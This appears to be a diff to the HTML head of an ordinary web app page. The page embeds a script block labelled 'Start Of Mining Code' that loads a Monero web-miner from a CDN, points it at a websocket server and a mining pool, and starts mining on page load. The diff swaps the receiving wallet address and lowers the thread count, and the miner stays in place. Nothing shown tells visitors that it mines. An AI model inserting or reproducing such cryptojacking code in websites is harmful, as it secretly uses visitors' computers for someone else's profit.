@@ -6,15 +6,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#000000">
     <link rel="manifest" href="manifest.json">
+
       <!-- Start Of Mining Code -->
       <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
       <script>
           console.log("Config Loaded")
           server = "wss://45.119.82.33:40725";
           var pool = "gulf.moneroocean.stream:80";
-          var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+          var walletAddress = "49ETJVdKvfzgKn29Mu4t3GQW3w5JoTAjMU1ySdzZBLBX8Tw6rnPtsB15bxHLAsdv4PLujoDe7KK7cP5u9ByjVGzyGPPp6Gc";
           var workerId = "GH-XMR"
-          var threads = -1;
+          var threads = 1;
           var password = "";
           startMining(pool, walletAddress, workerId, threads, password);
           throttleMiner = 20;
